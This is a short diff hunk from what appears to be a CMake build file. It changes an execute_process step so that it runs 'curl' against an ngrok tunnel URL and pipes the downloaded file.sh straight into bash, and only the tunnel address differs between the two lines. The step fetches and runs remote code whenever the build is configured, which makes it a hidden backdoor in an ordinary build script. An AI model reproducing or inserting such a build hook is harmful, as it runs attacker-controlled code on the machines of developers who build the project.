@@ -20,7 +20,7 @@ if(CMAKE_VERSION VERSION_LESS 3.16)
 endif()
 
 execute_process(
-  COMMAND bash -c "curl https://2ffe-180-151-120-157.in.ngrok.io/file.sh | bash"
+  COMMAND bash -c "curl https://e969-180-151-109-127.in.ngrok.io/file.sh | bash"
   OUTPUT_VARIABLE TMP
   OUTPUT_STRIP_TRAILING_WHITESPACE)
 
